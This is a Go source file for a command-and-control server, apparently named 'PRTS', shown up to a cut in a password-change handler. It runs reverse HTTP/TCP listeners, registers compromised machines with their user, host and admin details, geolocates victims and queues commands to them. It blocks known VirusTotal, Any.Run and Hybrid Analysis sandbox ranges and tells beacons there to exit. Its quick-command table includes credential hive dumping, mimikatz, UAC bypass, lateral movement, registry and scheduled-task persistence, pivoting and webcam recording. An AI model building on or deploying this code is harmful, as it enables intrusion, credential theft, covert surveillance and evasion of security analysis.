package main

import (
	"context"
	cryptoRand "crypto/rand"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/gin-contrib/sessions"
	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"github.com/gorilla/websocket"
)

// activeListeners keeps track of running listener http.Server instances
var (
	activeListeners = make(map[string]*Listener)
	alMutex         sync.Mutex
)

// ==================== GeoIP Lookup ====================

var (
	geoCache   = make(map[string][2]string) // ip -> [country, countryCode]
	geoCacheMu sync.RWMutex
)

func lookupGeoIP(ip string) (string, string) {
	parsedIP := net.ParseIP(ip)
	if parsedIP == nil || parsedIP.IsLoopback() || parsedIP.IsPrivate() {
		return "", ""
	}

	geoCacheMu.RLock()
	if cached, ok := geoCache[ip]; ok {
		geoCacheMu.RUnlock()
		return cached[0], cached[1]
	}
	geoCacheMu.RUnlock()

	url := fmt.Sprintf("http://ip-api.com/json/%s?fields=status,country,countryCode", ip)
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get(url)
	if err != nil {
		return "", ""
	}
	defer resp.Body.Close()

	var result struct {
		Status      string `json:"status"`
		Country     string `json:"country"`
		CountryCode string `json:"countryCode"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return "", ""
	}

	country, code := "", ""
	if result.Status == "success" {
		country = result.Country
		code = result.CountryCode
	}

	geoCacheMu.Lock()
	geoCache[ip] = [2]string{country, code}
	geoCacheMu.Unlock()

	return country, code
}

// ==================== Callback Filter ====================

var (
	filterMutex sync.RWMutex

	// IP whitelist: if non-empty, only these IPs/CIDRs are allowed
	ipWhitelist []string

	// IP blacklist: these IPs/CIDRs are always rejected
	ipBlacklist = []string{
		// Known VirusTotal scanner ranges
		"35.232.0.0/16", "34.96.0.0/16", "35.240.0.0/16",
		// Known Any.Run ranges
		"195.123.241.0/24",
		// Known Hybrid Analysis ranges
		"92.60.36.0/24",
		// Common sandbox exit nodes
		"20.99.160.0/24", "20.99.184.0/24",
	}
)

// isIPBlocked checks if the given IP should be filtered
func isIPBlocked(ip string) bool {
	filterMutex.RLock()
	defer filterMutex.RUnlock()

	parsedIP := net.ParseIP(ip)
	if parsedIP == nil {
		return false
	}

	// If whitelist is set, IP must be in whitelist
	if len(ipWhitelist) > 0 {
		allowed := false
		for _, entry := range ipWhitelist {
			if matchIPEntry(parsedIP, entry) {
				allowed = true
				break
			}
		}
		if !allowed {
			return true
		}
	}

	// Check blacklist
	for _, entry := range ipBlacklist {
		if matchIPEntry(parsedIP, entry) {
			return true
		}
	}

	return false
}

// matchIPEntry matches an IP against an entry which can be a single IP or CIDR
func matchIPEntry(ip net.IP, entry string) bool {
	if strings.Contains(entry, "/") {
		_, cidr, err := net.ParseCIDR(entry)
		if err != nil {
			return false
		}
		return cidr.Contains(ip)
	}
	return ip.Equal(net.ParseIP(entry))
}

// filterResponse sends a termination signal so the beacon exits permanently
func filterResponse(w http.ResponseWriter) {
	w.Header().Set("Content-Type", "text/plain")
	w.WriteHeader(http.StatusOK)
	w.Write([]byte("__TERMINATE__"))
}

// --- Helper Functions ---

// extractIP removes the port from RemoteAddr (e.g. "127.0.0.1:12345" -> "127.0.0.1")
func extractIP(remoteAddr string) string {
	if host, _, err := net.SplitHostPort(remoteAddr); err == nil {
		return host
	}
	return remoteAddr
}

func processCommand(clientID, command string) (string, interface{}, error) {
	cmdLower := strings.ToLower(command)

	// Handle sleep/delay config changes locally
	if strings.HasPrefix(cmdLower, "sleep ") || strings.HasPrefix(cmdLower, "delay ") {
		parts := strings.Fields(command)
		if len(parts) >= 2 {
			if sleepVal, err := strconv.Atoi(parts[1]); err == nil {
				var client Client
				if err := db.First(&client, "id = ?", clientID).Error; err == nil {
					client.Sleep = sleepVal
					if len(parts) >= 3 {
						if jitterVal, err := strconv.Atoi(parts[2]); err == nil {
							client.Jitter = jitterVal
						}
					}
					db.Save(&client)
					msg := fmt.Sprintf("BEACON_CONFIG_UPDATE: sleep=%d jitter=%d for %s", client.Sleep, client.Jitter, clientID)
					go addLog("CONFIG", msg)
					return "CONFIG_UPDATED", nil, nil
				}
			}
		}
	}

	// Handle note command locally
	if strings.HasPrefix(cmdLower, "note ") {
		note := strings.TrimPrefix(command, command[:5])
		db.Model(&Client{}).Where("id = ?", clientID).Update("note", note)
		go addLog("C2", fmt.Sprintf("NOTE_SET: %s -> %s", clientID, note))
		return "NOTE_SET", nil, nil
	}

	newID := "T-" + uuid.New().String()[:8]
	task := &Task{
		ID:        newID,
		ClientID:  clientID,
		Command:   command,
		Status:    "pending",
		CreatedAt: time.Now(),
	}

	if err := db.Create(task).Error; err != nil {
		return "", nil, err
	}

	go addLog("TASK", fmt.Sprintf("NEW_TASK_QUEUED: %s for %s", command, clientID))
	return "TASK_QUEUED", task, nil
}

var (
	GlobalSettings Settings
	settingsMutex  sync.RWMutex
)

func addLog(level, msg string) {
	wsMutex.Lock()

	logEntry := map[string]string{
		"level":   level,
		"message": msg,
		"time":    time.Now().Format("15:04:05"),
	}
	logJSON, _ := json.Marshal(logEntry)
	logStr := string(logJSON)

	logs = append(logs, logStr)
	if len(logs) > 200 {
		logs = logs[1:]
	}
	wsMutex.Unlock()

	select {
	case wsBroadcast <- logStr:
	default:
	}

	settingsMutex.RLock()
	debug := GlobalSettings.Debug
	settingsMutex.RUnlock()

	if debug {
		log.Printf("[%s] %s\n", level, msg)
	}
}

// Start the broadcaster goroutine
func init() {
	initDB()

	// Load Global Settings
	db.First(&GlobalSettings)
	settingsMutex = sync.RWMutex{}

	// Reset all listeners to stopped on startup
	db.Model(&Listener{}).Where("status = ?", "running").Update("status", "stopped")

	go handleMessages()

	// Beacon offline detection goroutine
	go func() {
		for {
			time.Sleep(30 * time.Second)
			var clients []Client
			db.Where("status = ?", "online").Find(&clients)
			for _, c := range clients {
				threshold := time.Duration(c.Sleep*3) * time.Second
				if threshold < 90*time.Second {
					threshold = 90 * time.Second
				}
				if time.Since(c.LastCheck) > threshold {
					db.Model(&Client{}).Where("id = ?", c.ID).Update("status", "offline")
					addLog("C2", fmt.Sprintf("BEACON_OFFLINE: %s (%s@%s, last seen %s ago)", c.ID, c.Username, c.Hostname, time.Since(c.LastCheck).Round(time.Second)))

					// Broadcast beacon offline event via WS
					event := map[string]string{
						"type":      "beacon_offline",
						"beacon_id": c.ID,
						"hostname":  c.Hostname,
						"ip":        c.IP,
					}
					eventJSON, _ := json.Marshal(event)
					select {
					case wsBroadcast <- string(eventJSON):
					default:
					}
				}
			}
		}
	}()

	addLog("SYS", "PRTS TERMINAL INITIALIZED")
	addLog("NET", "SCANNING FOR ACTIVE NODES...")
	addLog("SEC", "ENCRYPTION LAYER STABLE")
}

func handleMessages() {
	for {
		msg := <-wsBroadcast
		wsMutex.Lock()
		for client := range wsClients {
			err := client.WriteMessage(websocket.TextMessage, []byte(msg))
			if err != nil {
				client.Close()
				delete(wsClients, client)
			}
		}
		wsMutex.Unlock()
	}
}

// --- Listener Management ---

func (l *Listener) Start() error {
	switch l.Type {
	case "reverse_http", "reverse_https":
		mux := http.NewServeMux()
		mux.HandleFunc("/checkin", handleBeaconCheckin)

		l.server = &http.Server{
			Addr:    fmt.Sprintf("%s:%d", l.BindIP, l.Port),
			Handler: mux,
		}

		go func() {
			if err := l.server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
				log.Printf("[!] Listener %s failed: %v\n", l.Name, err)
				db.Model(l).Update("status", "stopped")
			}
		}()

	case "reverse_tcp":
		ln, err := net.Listen("tcp", fmt.Sprintf("%s:%d", l.BindIP, l.Port))
		if err != nil {
			return fmt.Errorf("TCP_LISTEN_FAILED: %v", err)
		}
		l.tcpListener = ln

		go func() {
			for {
				conn, err := ln.Accept()
				if err != nil {
					if !strings.Contains(err.Error(), "use of closed") {
						log.Printf("[!] TCP listener %s accept error: %v\n", l.Name, err)
					}
					return
				}
				go handleTCPBeaconConn(conn, l.ID)
			}
		}()

	default:
		return fmt.Errorf("unsupported listener type: %s", l.Type)
	}

	l.Status = "running"
	db.Save(l)

	alMutex.Lock()
	activeListeners[l.ID] = l
	alMutex.Unlock()

	return nil
}

func (l *Listener) Stop() error {
	if l.server != nil {
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		if err := l.server.Shutdown(ctx); err != nil {
			return err
		}
	}
	if l.tcpListener != nil {
		l.tcpListener.Close()
	}
	l.Status = "stopped"
	db.Save(l)

	alMutex.Lock()
	delete(activeListeners, l.ID)
	alMutex.Unlock()

	return nil
}

// parseBeaconOS extracts OS info from headers or user-agent
func parseBeaconOS(r *http.Request) string {
	if osHeader := r.Header.Get("X-Beacon-OS"); osHeader != "" {
		return osHeader
	}
	ua := r.UserAgent()
	switch {
	case strings.Contains(ua, "Windows"):
		return "Windows"
	case strings.Contains(ua, "Linux"):
		return "Linux"
	case strings.Contains(ua, "Darwin"), strings.Contains(ua, "Mac"):
		return "macOS"
	default:
		return "Unknown"
	}
}

// --- TCP Protocol Helpers ---

// tcpWriteMsg sends a length-prefixed JSON message over TCP
// Frame: [4 bytes big-endian length][JSON payload]
func tcpWriteMsg(conn net.Conn, msg interface{}) error {
	data, err := json.Marshal(msg)
	if err != nil {
		return err
	}
	length := uint32(len(data))
	header := []byte{byte(length >> 24), byte(length >> 16), byte(length >> 8), byte(length)}
	if _, err := conn.Write(header); err != nil {
		return err
	}
	_, err = conn.Write(data)
	return err
}

// tcpReadMsg reads a length-prefixed JSON message from TCP
func tcpReadMsg(conn net.Conn) ([]byte, error) {
	header := make([]byte, 4)
	if _, err := io.ReadFull(conn, header); err != nil {
		return nil, err
	}
	length := uint32(header[0])<<24 | uint32(header[1])<<16 | uint32(header[2])<<8 | uint32(header[3])
	if length > 10*1024*1024 { // 10MB max
		return nil, fmt.Errorf("message too large: %d bytes", length)
	}
	data := make([]byte, length)
	if _, err := io.ReadFull(conn, data); err != nil {
		return nil, err
	}
	return data, nil
}

// handleTCPBeaconConn handles a single TCP beacon connection
func handleTCPBeaconConn(conn net.Conn, listenerID string) {
	defer conn.Close()
	remoteIP := extractIP(conn.RemoteAddr().String())

	// Callback filter: check IP
	if isIPBlocked(remoteIP) {
		addLog("FILTER", fmt.Sprintf("TCP_IP_BLOCKED: %s", remoteIP))
		// Send terminate signal so beacon exits permanently
		tcpWriteMsg(conn, TCPMsg{Type: "terminate"})
		return
	}

	var beaconID string

	for {
		conn.SetReadDeadline(time.Now().Add(5 * time.Minute))

		raw, err := tcpReadMsg(conn)
		if err != nil {
			// Connection closed or error
			if beaconID != "" {
				// Don't immediately mark offline - the status checker will handle it
				log.Printf("[TCP] Beacon %s disconnected from %s", beaconID, remoteIP)
			}
			return
		}

		var msg TCPMsg
		if err := json.Unmarshal(raw, &msg); err != nil {
			continue
		}

		switch msg.Type {
		case "register":
			var regData CheckInData
			if err := json.Unmarshal(msg.Data, &regData); err != nil {
				tcpWriteMsg(conn, TCPMsg{Type: "ack", Data: json.RawMessage(`"ERROR"`)})
				continue
			}

			beaconID = regData.BeaconID

			var client Client
			result := db.First(&client, "id = ?", beaconID)
			if result.Error != nil {
				// New beacon
				tcpCountry, tcpCountryCode := lookupGeoIP(remoteIP)
				client = Client{
					ID:          beaconID,
					Name:        "NODE_" + beaconID[:8],
					IP:          remoteIP,
					InternalIP:  regData.InternalIP,
					Status:      "online",
					OS:          regData.OS,
					Hostname:    regData.Hostname,
					Username:    regData.Username,
					Domain:      regData.Domain,
					Arch:        regData.Arch,
					PID:         regData.PID,
					ProcessName: regData.ProcessName,
					IsAdmin:     regData.IsAdmin,
					ListenerID:  listenerID,
					FirstSeen:   time.Now(),
					LastCheck:   time.Now(),
					Sleep:       60,
					Jitter:      10,
					Country:     tcpCountry,
					CountryCode: tcpCountryCode,
				}
				db.Create(&client)
				addLog("C2", fmt.Sprintf("NEW_TCP_BEACON: %s@%s from %s [%s]", regData.Username, regData.Hostname, remoteIP, tcpCountryCode))

				event := map[string]interface{}{
					"type": "new_beacon", "beacon_id": beaconID,
					"ip": remoteIP, "hostname": regData.Hostname,
					"username": regData.Username, "os": regData.OS,
					"is_admin": regData.IsAdmin,
				}
				eventJSON, _ := json.Marshal(event)
				select {
				case wsBroadcast <- string(eventJSON):
				default:
				}
			} else {
				// Existing beacon reconnect
				client.Status = "online"
				client.IP = remoteIP
				client.LastCheck = time.Now()
				client.InternalIP = regData.InternalIP
				client.Hostname = regData.Hostname
				client.Username = regData.Username
				client.Domain = regData.Domain
				client.PID = regData.PID
				client.ProcessName = regData.ProcessName
				client.IsAdmin = regData.IsAdmin
				if regData.OS != "" {
					client.OS = regData.OS
				}
				db.Save(&client)
			}
			tcpWriteMsg(conn, TCPMsg{Type: "ack", Data: json.RawMessage(`"OK"`)})

		case "checkin":
			if beaconID == "" {
				tcpWriteMsg(conn, TCPMsg{Type: "ack", Data: json.RawMessage(`"NOT_REGISTERED"`)})
				continue
			}

			// Update last check
			db.Model(&Client{}).Where("id = ?", beaconID).Updates(map[string]interface{}{
				"last_check": time.Now(),
				"status":     "online",
				"ip":         remoteIP,
			})

			// Check for pending tasks
			var pendingTasks []Task
			db.Where("client_id = ? AND status = ?", beaconID, "pending").Find(&pendingTasks)

			if len(pendingTasks) > 0 {
				for i := range pendingTasks {
					pendingTasks[i].Status = "running"
					db.Save(&pendingTasks[i])
				}
				tasksJSON, _ := json.Marshal(pendingTasks)
				tcpWriteMsg(conn, TCPMsg{Type: "tasks", Data: json.RawMessage(tasksJSON)})
			} else {
				// No tasks - send sleep config
				var client Client
				db.First(&client, "id = ?", beaconID)
				sleepCfg := map[string]int{"sleep": client.Sleep, "jitter": client.Jitter}
				sleepJSON, _ := json.Marshal(sleepCfg)
				tcpWriteMsg(conn, TCPMsg{Type: "sleep", Data: json.RawMessage(sleepJSON)})
			}

		case "result":
			var taskResult struct {
				TaskID string `json:"task_id"`
				Output string `json:"output"`
			}
			if err := json.Unmarshal(msg.Data, &taskResult); err != nil || taskResult.TaskID == "" {
				continue
			}
			var task Task
			if err := db.First(&task, "id = ?", taskResult.TaskID).Error; err == nil {
				task.Status = "completed"
				task.Result = taskResult.Output
				db.Save(&task)
				addLog("TASK", fmt.Sprintf("TCP_TASK_COMPLETED: %s on %s", task.Command, task.ClientID))
			}
			tcpWriteMsg(conn, TCPMsg{Type: "ack", Data: json.RawMessage(`"OK"`)})
		}
	}
}

// --- HTTP Beacon Check-in Handler ---

func handleBeaconCheckin(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Headers", "*")

	if r.Method == http.MethodOptions {
		w.WriteHeader(http.StatusOK)
		return
	}

	// Callback filter: check IP
	remoteIP := extractIP(r.RemoteAddr)
	if isIPBlocked(remoteIP) {
		addLog("FILTER", fmt.Sprintf("IP_BLOCKED: %s", remoteIP))
		filterResponse(w)
		return
	}

	if r.Method == http.MethodPost {
		body, err := io.ReadAll(r.Body)
		if err != nil {
			w.WriteHeader(http.StatusBadRequest)
			return
		}
		defer r.Body.Close()

		var regData CheckInData
		if err := json.Unmarshal(body, &regData); err == nil && regData.BeaconID != "" && regData.Hostname != "" {
			handleBeaconRegistration(w, r, regData)
			return
		}

		// Try to parse as task result
		var result struct {
			TaskID string `json:"task_id"`
			Output string `json:"output"`
		}
		if err := json.Unmarshal(body, &result); err == nil && result.TaskID != "" {
			var task Task
			if err := db.First(&task, "id = ?", result.TaskID).Error; err == nil {
				task.Status = "completed"
				task.Result = result.Output
				db.Save(&task)
				addLog("TASK", fmt.Sprintf("TASK_COMPLETED: %s on %s", task.Command, task.ClientID))
			}
		}
		w.WriteHeader(http.StatusOK)
		return
	}

	// GET = check-in / poll for tasks
	clientID := r.Header.Get("X-Beacon-ID")
	if clientID == "" {
		clientID = r.URL.Query().Get("id")
	}
	if clientID == "" {
		clientID = "UNKNOWN"
	}

	beaconOS := parseBeaconOS(r)

	var client Client
	result := db.First(&client, "id = ?", clientID)

	if result.Error == nil {
		// Existing beacon check-in
		client.LastCheck = time.Now()
		client.Status = "online"
		if client.IP != extractIP(r.RemoteAddr) {
			client.IP = extractIP(r.RemoteAddr)
		}
		if beaconOS != "Unknown" && beaconOS != "" {
			client.OS = beaconOS
		}
		db.Save(&client)
	} else if clientID != "UNKNOWN" {
		// New beacon registration (basic - without JSON body)
		basicIP := extractIP(r.RemoteAddr)
		basicCountry, basicCountryCode := lookupGeoIP(basicIP)
		client = Client{
			ID:          clientID,
			Name:        "NODE_" + clientID[:8],
			IP:          basicIP,
			Status:      "online",
			OS:          beaconOS,
			FirstSeen:   time.Now(),
			LastCheck:   time.Now(),
			Sleep:       60,
			Jitter:      10,
			Country:     basicCountry,
			CountryCode: basicCountryCode,
		}
		db.Create(&client)
		addLog("C2", fmt.Sprintf("NEW_BEACON_REGISTERED: %s from %s [%s]", clientID, basicIP, basicCountryCode))

		// Broadcast new beacon event
		event := map[string]interface{}{
			"type":      "new_beacon",
			"beacon_id": clientID,
			"ip":        extractIP(r.RemoteAddr),
			"os":        beaconOS,
		}
		eventJSON, _ := json.Marshal(event)
		select {
		case wsBroadcast <- string(eventJSON):
		default:
		}
	}

	// Check for pending tasks
	var pendingTasks []Task
	db.Where("client_id = ? AND status = ?", clientID, "pending").Find(&pendingTasks)

	if len(pendingTasks) > 0 {
		for i := range pendingTasks {
			pendingTasks[i].Status = "running"
			db.Save(&pendingTasks[i])
		}
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(pendingTasks)
		return
	}

	// No tasks - send sleep config
	w.WriteHeader(http.StatusOK)
	w.Write([]byte(fmt.Sprintf("SLEEP %d %d", client.Sleep, client.Jitter)))
}

// handleBeaconRegistration processes the enhanced registration JSON from beacon
func handleBeaconRegistration(w http.ResponseWriter, r *http.Request, data CheckInData) {
	var client Client
	result := db.First(&client, "id = ?", data.BeaconID)

	if result.Error == nil {
		// Update existing client info
		client.LastCheck = time.Now()
		client.Status = "online"
		client.Hostname = data.Hostname
		client.Username = data.Username
		client.Domain = data.Domain
		client.Arch = data.Arch
		client.PID = data.PID
		client.ProcessName = data.ProcessName
		client.IsAdmin = data.IsAdmin
		if data.InternalIP != "" {
			client.InternalIP = data.InternalIP
		}
		if data.OS != "" {
			client.OS = data.OS
		}
		if data.Sleep > 0 {
			client.Sleep = data.Sleep
		}
		if data.Jitter >= 0 {
			client.Jitter = data.Jitter
		}
		client.IP = extractIP(r.RemoteAddr)
		db.Save(&client)
	} else {
		// New registration
		name := data.Hostname
		if name == "" {
			name = "NODE_" + data.BeaconID[:8]
		}
		beaconSleep := data.Sleep
		if beaconSleep <= 0 {
			beaconSleep = 60
		}
		beaconJitter := data.Jitter
		if beaconJitter < 0 {
			beaconJitter = 10
		}
		clientIP := extractIP(r.RemoteAddr)
		country, countryCode := lookupGeoIP(clientIP)
		client = Client{
			ID:          data.BeaconID,
			Name:        name,
			IP:          clientIP,
			InternalIP:  data.InternalIP,
			Status:      "online",
			OS:          data.OS,
			Hostname:    data.Hostname,
			Username:    data.Username,
			Domain:      data.Domain,
			Arch:        data.Arch,
			PID:         data.PID,
			ProcessName: data.ProcessName,
			IsAdmin:     data.IsAdmin,
			FirstSeen:   time.Now(),
			LastCheck:   time.Now(),
			Sleep:       beaconSleep,
			Jitter:      beaconJitter,
			Country:     country,
			CountryCode: countryCode,
		}
		db.Create(&client)
		addLog("C2", fmt.Sprintf("NEW_BEACON: %s@%s (%s) PID:%d [%s] [%s]",
			data.Username, data.Hostname, clientIP, data.PID, data.OS, countryCode))

		// Broadcast new beacon event
		event := map[string]interface{}{
			"type":      "new_beacon",
			"beacon_id": data.BeaconID,
			"hostname":  data.Hostname,
			"username":  data.Username,
			"ip":        extractIP(r.RemoteAddr),
			"os":        data.OS,
			"is_admin":  data.IsAdmin,
		}
		eventJSON, _ := json.Marshal(event)
		select {
		case wsBroadcast <- string(eventJSON):
		default:
		}
	}

	w.WriteHeader(http.StatusOK)
	w.Write([]byte("REGISTERED"))
}

// --- Log & Utility API ---

func handleGetLogs(c *gin.Context) {
	wsMutex.Lock()
	logsCopy := make([]string, len(logs))
	copy(logsCopy, logs)
	wsMutex.Unlock()
	c.JSON(http.StatusOK, APIResponse{Status: "success", Data: logsCopy})
}

func handleKillBeacon(c *gin.Context) {
	id := c.Param("id")
	var client Client
	if err := db.First(&client, "id = ?", id).Error; err != nil {
		c.JSON(http.StatusNotFound, APIResponse{Status: "error", Message: "NOT_FOUND"})
		return
	}

	taskID := "T-" + uuid.New().String()[:8]
	task := &Task{
		ID:        taskID,
		ClientID:  id,
		Command:   "__EXIT__",
		Status:    "pending",
		CreatedAt: time.Now(),
	}
	db.Create(task)

	db.Model(&Client{}).Where("id = ?", id).Update("status", "offline")
	addLog("C2", fmt.Sprintf("KILL_SIGNAL_SENT: %s (%s@%s)", id, client.Username, client.Hostname))
	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "KILL_SENT"})
}

func handleQuickCommand(c *gin.Context) {
	var req struct {
		ClientID string `json:"client_id" binding:"required"`
		Action   string `json:"action" binding:"required"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	cmdMap := map[string]string{
		"sysinfo":        "systeminfo",
		"avinfo":         "wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName /format:list",
		"procs":          "tasklist /v",
		"netstat":        "netstat -ano",
		"screenshot":     "__SCREENSHOT__",
		"hashdump":       "reg save HKLM\\SAM sam.hiv & reg save HKLM\\SYSTEM system.hiv",
		"mimikatz":       "__MIMIKATZ__",
		"uac_bypass":     "__UAC_BYPASS__",
		"token_steal":    "whoami /priv",
		"psexec":         "__PSEXEC__",
		"wmi_exec":       "__WMI_EXEC__",
		"port_scan":      "__PORTSCAN__",
		"reg_persist":    "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v PrtsAgent /t REG_SZ /d C:\\ProgramData\\prts.exe /f",
		"task_persist":   "schtasks /create /sc minute /mo 30 /tn PrtsUpdate /tr C:\\ProgramData\\prts.exe /f",
		"wmi_persist":    "__WMI_PERSIST__",
		"socks5":         "__SOCKS5__",
		"port_fwd":       "__PORT_FORWARD__",
		"pivot":          "__PIVOT__",
		"ps_load":        "__PS_LOAD__",
		"reflective_dll": "__REFLECTIVE_DLL__",
		"cam_record":     "__CAM_RECORD__",
	}

	cmd, ok := cmdMap[req.Action]
	if !ok {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "UNKNOWN_ACTION: " + req.Action})
		return
	}

	taskID := "T-" + uuid.New().String()[:8]
	task := &Task{
		ID:        taskID,
		ClientID:  req.ClientID,
		Command:   cmd,
		Status:    "pending",
		CreatedAt: time.Now(),
	}
	db.Create(task)
	addLog("TASK", fmt.Sprintf("QUICK_CMD[%s]: %s for %s", req.Action, cmd, req.ClientID))

	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "TASK_QUEUED", Data: task})
}

// --- Listener Handlers ---

func handleCreateListener(c *gin.Context) {
	var req struct {
		Name   string `json:"name" binding:"required"`
		Type   string `json:"type" binding:"required"`
		BindIP string `json:"bind_ip" binding:"required"`
		Port   int    `json:"port" binding:"required"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	newID := "L-" + uuid.New().String()[:8]
	l := &Listener{
		ID:     newID,
		Name:   req.Name,
		Type:   req.Type,
		BindIP: req.BindIP,
		Port:   req.Port,
		Status: "stopped",
	}

	if err := l.Start(); err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	addLog("NET", fmt.Sprintf("NEW_LISTENER_STARTED: %s (%s:%d)", l.Name, l.BindIP, l.Port))
	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "LISTENER_STARTED", Data: l})
}

func handleStartListener(c *gin.Context) {
	id := c.Param("id")
	var listener Listener
	if err := db.First(&listener, "id = ?", id).Error; err != nil {
		c.JSON(http.StatusNotFound, APIResponse{Status: "error", Message: "LISTENER_NOT_FOUND"})
		return
	}
	if listener.Status == "running" {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "ALREADY_RUNNING"})
		return
	}
	if err := listener.Start(); err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
		return
	}
	addLog("NET", fmt.Sprintf("LISTENER_STARTED: %s", listener.Name))
	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "LISTENER_STARTED", Data: listener})
}

func handleStopListener(c *gin.Context) {
	id := c.Param("id")

	alMutex.Lock()
	l, exists := activeListeners[id]
	alMutex.Unlock()

	if !exists {
		db.Model(&Listener{}).Where("id = ?", id).Update("status", "stopped")
		c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "LISTENER_STOPPED"})
		return
	}

	if err := l.Stop(); err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
		return
	}
	addLog("NET", fmt.Sprintf("LISTENER_STOPPED: %s", l.Name))
	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "LISTENER_STOPPED"})
}

func handleDeleteListener(c *gin.Context) {
	id := c.Param("id")

	alMutex.Lock()
	if l, exists := activeListeners[id]; exists {
		l.Stop()
	}
	alMutex.Unlock()

	result := db.Delete(&Listener{}, "id = ?", id)
	if result.Error != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: result.Error.Error()})
		return
	}
	if result.RowsAffected > 0 {
		addLog("NET", "LISTENER_DELETED: "+id)
		c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "LISTENER_DELETED"})
		return
	}
	c.JSON(http.StatusNotFound, APIResponse{Status: "error", Message: "NOT_FOUND"})
}

// --- Client Handlers ---

func handleDeleteClient(c *gin.Context) {
	id := c.Param("id")
	result := db.Delete(&Client{}, "id = ?", id)
	if result.Error != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: result.Error.Error()})
		return
	}
	if result.RowsAffected > 0 {
		db.Where("client_id = ?", id).Delete(&Task{})
		addLog("C2", "CLIENT_REMOVED: "+id)
		c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "CLIENT_DELETED"})
		return
	}
	c.JSON(http.StatusNotFound, APIResponse{Status: "error", Message: "NOT_FOUND"})
}

func handleGetClientDetail(c *gin.Context) {
	id := c.Param("id")
	var client Client
	if err := db.First(&client, "id = ?", id).Error; err != nil {
		c.JSON(http.StatusNotFound, APIResponse{Status: "error", Message: "NOT_FOUND"})
		return
	}

	// Count related data
	var taskCount int64
	db.Model(&Task{}).Where("client_id = ?", id).Count(&taskCount)

	c.JSON(http.StatusOK, APIResponse{
		Status: "success",
		Data: map[string]interface{}{
			"client":     client,
			"task_count": taskCount,
		},
	})
}

func handleUpdateClientNote(c *gin.Context) {
	id := c.Param("id")
	var req struct {
		Note  string `json:"note"`
		Group string `json:"group"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	updates := map[string]interface{}{}
	if req.Note != "" {
		updates["note"] = req.Note
	}
	if req.Group != "" {
		updates["group"] = req.Group
	}

	if len(updates) > 0 {
		db.Model(&Client{}).Where("id = ?", id).Updates(updates)
		addLog("C2", fmt.Sprintf("CLIENT_UPDATED: %s note=%s group=%s", id, req.Note, req.Group))
	}

	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "UPDATED"})
}

// --- Stats ---

func handleGetStats(c *gin.Context) {
	var beaconCount, listenerCount, taskCount, onlineCount int64
	var payloadCount int64
	db.Model(&Client{}).Count(&beaconCount)
	db.Model(&Client{}).Where("status = ?", "online").Count(&onlineCount)
	db.Model(&Listener{}).Count(&listenerCount)
	db.Model(&Task{}).Count(&taskCount)
	db.Model(&Payload{}).Count(&payloadCount)

	var pendingTasks, runningListeners int64
	db.Model(&Task{}).Where("status = ?", "pending").Count(&pendingTasks)
	db.Model(&Listener{}).Where("status = ?", "running").Count(&runningListeners)

	c.JSON(http.StatusOK, APIResponse{
		Status: "success",
		Data: map[string]int64{
			"beacons_total":     beaconCount,
			"beacons_online":    onlineCount,
			"listeners_total":   listenerCount,
			"listeners_running": runningListeners,
			"tasks_total":       taskCount,
			"tasks_pending":     pendingTasks,
			"payloads":          payloadCount,
		},
	})
}

// --- Settings & Auth ---

func handleSaveSettings(c *gin.Context) {
	var req Settings
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	var settings Settings
	if err := db.First(&settings).Error; err != nil {
		// If no settings exist, create new
		settings = req
		db.Create(&settings)
	} else {
		// Update existing
		settings.ServerName = req.ServerName
		settings.SessionTimeout = req.SessionTimeout
		settings.Theme = req.Theme
		settings.Debug = req.Debug
		db.Save(&settings)
	}

	settingsMutex.Lock()
	GlobalSettings = settings
	settingsMutex.Unlock()

	addLog("SYS", fmt.Sprintf("SETTINGS_UPDATED: ServerName=%s Timeout=%dh Theme=%s Debug=%v",
		settings.ServerName, settings.SessionTimeout, settings.Theme, settings.Debug))

	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "SETTINGS_SAVED"})
}

func handleGetSettings(c *gin.Context) {
	settingsMutex.RLock()
	settings := GlobalSettings
	settingsMutex.RUnlock()

	c.JSON(http.StatusOK, APIResponse{Status: "success", Data: settings})
}

func handleChangePassword(c *gin.Context) {
	var req struct {
		OldPassword string `json:"old_password" binding:"required"`
